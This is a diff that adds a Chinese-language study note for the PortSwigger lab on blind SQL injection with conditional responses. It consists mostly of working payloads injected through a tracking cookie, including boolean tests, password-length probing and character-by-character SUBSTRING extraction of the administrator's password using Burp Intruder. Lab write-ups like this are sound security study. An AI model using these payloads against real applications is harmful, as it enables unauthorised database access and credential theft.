@@ -1,0 +1,33 @@
+### 条件响应盲注 ###
+https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+应用行为：根据是否提交cookie显示欢迎文本
+注入点 Cookie: TrackingId=VoA4BQx0qTLjdRdh
+
+' AND 'a'='b
+不显示文本
+' AND 'a'='a
+显示文本
+
+或使用
+' AND 1=2 --
+' AND 1=1 --
+
+使用提供的表名与列名与用户名构成输入
+检查表名列名与用户名是否准确
+' AND (SELECT username FROM users WHERE username = 'administrator') = 'administrator' -- 
+
+# 使用 LENGTH 时要多加一对圆括号#
+使用 LENGTH 获得字符串长度，可手动二分，可发送到攻击器
+' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) >= 20 -- 
+
+发送到攻击器的集群炸弹，根据提供的密码范围设置字串位置为1-20，密码字符列表为数字与小写字母
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),$1$,1) = '$a$' -- 
+
+@ 示例解决方案，区别在于一个是选择整个字符串后提取字串，一个是提取其字串后选择此字串
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§ 
+@
+
+
+
+
+
